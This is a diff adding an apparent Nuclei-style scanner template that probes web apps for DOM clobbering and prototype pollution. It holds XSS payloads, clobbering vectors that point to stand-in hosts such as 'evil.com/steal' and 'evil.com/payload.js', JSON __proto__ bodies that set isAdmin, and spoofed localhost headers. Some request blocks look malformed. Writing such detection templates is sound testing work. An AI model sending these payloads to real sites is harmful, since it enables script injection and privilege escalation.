@@ -1,0 +1,390 @@
+id: medium-webapp-dom-clobbering-prototype-pollution
+
+info:
+  name: DOM Clobbering with Prototype Pollution - Elite Red Team
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced DOM clobbering combined with prototype pollution techniques.
+    Tests for DOM clobbering vulnerabilities that can lead to prototype pollution.
+    Includes multiple client-side exploitation vectors and JavaScript injection methods.
+  reference:
+    - https://portswigger.net/web-security/dom-based/dom-clobbering
+    - https://portswigger.net/web-security/prototype-pollution
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+  tags: dom-clobbering,prototype-pollution,client-side,xss,red-team
+
+variables:
+  # Common DOM clobbering vectors
+  clobbering_vectors:
+    - "window"
+    - "document"
+    - "location"
+    - "navigator"
+    - "history"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/user"
+      - "{{BaseURL}}/admin"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    # Test basic DOM clobbering with form elements
+    raw:
+      - |
+        GET {{path}}?search=<form id="x"><input name="y" value="<img src=x onerror=alert(1)>"></form> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<form id=\"x\">"
+          - "name=\"y\""
+          - "onerror=alert(1)"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "Content-Security-Policy"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '<form[^>]+id=["\']([^"\']+)["\'][^>]*>'
+          - '<input[^>]+name=["\']([^"\']+)["\'][^>]*>'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/comment"
+      - "{{BaseURL}}/feedback"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Test DOM clobbering with anchor tags
+    body: |
+      comment=<a id="config" href="javascript:alert('DOM Clobbering')">Click</a><a id="config" name="apiUrl" href="//evil.com/api">API</a>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "id=\"config\""
+          - "javascript:alert"
+          - "//evil.com/api"
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile"
+
+    # Test prototype pollution via DOM clobbering
+    raw:
+      - |
+        GET {{path}}?name=<form><input name="constructor" value="<img src=x onerror=alert('Prototype Pollution')>"></form> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "name=\"constructor\""
+          - "onerror=alert('Prototype Pollution')"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/user/update"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test JSON prototype pollution
+    body: |
+      {
+        "name": "test",
+        "__proto__": {
+          "isAdmin": true,
+          "role": "admin"
+        },
+        "constructor": {
+          "prototype": {
+            "isAdmin": true
+          }
+        }
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "isAdmin"
+          - "admin"
+          - "role"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search"
+
+    # Test DOM clobbering with iframe
+    raw:
+      - |
+        GET {{path}}?q=<iframe name="x" srcdoc="<script>parent.alert('DOM Clobbering via iframe')</script>"></iframe> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<iframe name=\"x\""
+          - "parent.alert"
+          - "DOM Clobbering via iframe"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/comment"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-Proto: https
+
+    # Test DOM clobbering with object tag
+    body: |
+      text=<object id="x" data="javascript:alert('DOM Clobbering via object')"></object><object id="x" name="src" data="//evil.com/payload.js"></object>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<object id=\"x\""
+          - "javascript:alert"
+          - "//evil.com/payload.js"
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+
+    # Test DOM clobbering with embed tag
+    raw:
+      - |
+        GET {{path}}?data=<embed id="config" src="javascript:alert('DOM Clobbering')"><embed id="config" name="apiEndpoint" src="//attacker.com/api"> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<embed id=\"config\""
+          - "javascript:alert"
+          - "//attacker.com/api"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/feedback"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test DOM clobbering with image map
+    body: |
+      message=<map name="x"><area id="y" href="javascript:alert('DOM Clobbering via map')"></map><img usemap="#x" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<map name=\"x\">"
+          - "javascript:alert"
+          - "usemap=\"#x\""
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/user"
+
+    # Test DOM clobbering with select options
+    raw:
+      - |
+        GET {{path}}?filter=<select id="x"><option value="<img src=x onerror=alert('DOM Clobbering')>">Option</option></select> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<select id=\"x\">"
+          - "onerror=alert"
+          - "DOM Clobbering"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/data"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Test prototype pollution via JSON merge
+    body: |
+      {
+        "user": {
+          "name": "test",
+          "__proto__": {
+            "polluted": "true",
+            "isAdmin": true
+          }
+        },
+        "merge": true
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "polluted"
+          - "isAdmin"
+          - "true"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search"
+
+    # Test DOM clobbering with table elements
+    raw:
+      - |
+        GET {{path}}?term=<table><tr><td id="x" onclick="alert('DOM Clobbering via table')">Click</td></tr></table> HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<td id=\"x\""
+          - "onclick=\"alert"
+          - "DOM Clobbering via table"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/settings"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-Proto: https
+
+    # Test DOM clobbering with button elements
+    body: |
+      config=<button id="submit" onclick="alert('DOM Clobbering via button')" formaction="//evil.com/steal">Submit</button>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<button id=\"submit\""
+          - "onclick=\"alert"
+          - "formaction=\"//evil.com/steal\""
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'id=["\']([^"\']+)["\'][^>]*onclick=["\']([^"\']+)["\']'
+          - 'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']+)["\']'
+          - '__proto__["\']?\s*:\s*\{([^}]+)\}'
+          - 'constructor["\']?\s*:\s*\{([^}]+)\}'
